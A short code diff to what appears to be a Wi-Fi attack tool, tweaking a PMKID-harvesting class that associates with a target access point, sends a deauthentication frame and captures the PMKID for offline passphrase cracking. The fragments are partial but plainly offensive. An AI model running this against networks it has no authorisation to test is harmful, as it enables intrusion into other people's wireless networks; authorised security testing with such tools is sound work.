@@ -37,7 +37,7 @@ from wifit3.dot11.pmf import PmfPosture
 from wifit3.dot11.rsn import AKM_PSK
 
 from .campaign import Campaign
-from .auth_assoc import Association
+from wifit3.wlan.station import Association
 
 logger = logging.getLogger(__name__)
 
@@ -199,7 +199,8 @@ class PmkidHarvestAttack(Campaign):
                     assoc = Association(iface, self.target.bssid, self.target.ssid or "",
                                         self.target.channel, our_mac=self.source_mac,
                                         assoc_trailer_ies=self._assoc_rsn_ie,
-                                        should_stop=lambda: self.stopped)
+                                        should_stop=lambda: self.stopped,
+                                        beacon_frame=self.target.last_beacon_frame)
                     assoc.start()
                     try:
                         await assoc.associate()
@@ -214,6 +215,7 @@ class PmkidHarvestAttack(Campaign):
                         hs = self._received_m1()
                         if hs is not None:
                             await self._send_leaving_deauth()
+                            await asyncio.sleep(0.5)
                             if hs.pmkid:
                                 if hs.pmkid_akm is None:
                                     hs.pmkid_akm = AKM_PSK    # we negotiated PSK in our Assoc
